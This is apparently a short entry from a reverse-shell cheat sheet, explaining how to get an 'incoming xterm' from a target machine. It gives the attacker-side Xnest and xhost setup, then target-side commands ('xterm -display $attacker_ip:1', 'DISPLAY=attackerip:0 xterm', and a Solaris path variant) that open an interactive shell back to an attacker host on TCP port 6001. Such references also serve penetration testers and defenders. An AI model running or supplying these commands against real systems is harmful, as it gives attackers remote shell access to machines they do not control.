# Xterm
To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:

Xnest :1

Then remember to authorise on your system the target IP to connect to you:

xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:

xterm -display $attacker_ip:1

Or:

$ DISPLAY=attackerip:0 xterm

It will try to connect back to you, $attacker_ip, on TCP port 6001.

Note that on Solaris xterm path is usually not within the PATH environment
variable, you need to specify its filepath: /usr/openwin/bin/xterm
-display $attacker_ip:1
